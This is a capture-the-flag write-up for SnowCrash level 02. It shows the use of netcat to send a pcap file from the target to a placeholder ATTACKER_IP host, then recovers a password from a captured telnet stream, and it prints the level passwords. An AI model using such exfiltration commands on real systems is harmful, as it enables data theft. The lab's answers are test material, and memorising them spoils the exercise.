# LEVEL 02

> [!TIP]
> user: `level02` <br>
> pass: `f2av5il02puano7naaf6adaaf`

## STEP 01

Retrieve the [level02.pcap](https://github.com/Pixailz/SnowCrash/tree/main/level02/resources/level02.pcap) file

> on the attacker machine
```bash
nc -lvp 4444 > level02.pcap
```

> on the snowcrash machine
```bash
cat level02.pcap | nc ATTACKER_IP 4444
```

## STEP 02

Opening the **level02.pcap** file with Wireshark show us a TCP stream from a
TELNET session, i believe

Here is the followed stream output
```
..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
..............................1.......!.."......"......!..........."........"..".............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.lX.X
..
Password: ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login:                                      n:
```

## STEP 03

A little bit of guessing

It seems that we need to go deeper with the **Password: ft_wandr...NDRel.L0L**
part

> [!TIP]
> '.' represent 0x7f and it's not printable, that's why it's represented with
> '.'

So guessing that those 0x7f is a **backspace**, deleting and reformating give us
the following password
`ft_waNDReL0L`

> [!IMPORTANT]
> the password for the next level is `kooda2puivaav1idi4f57q8iq`
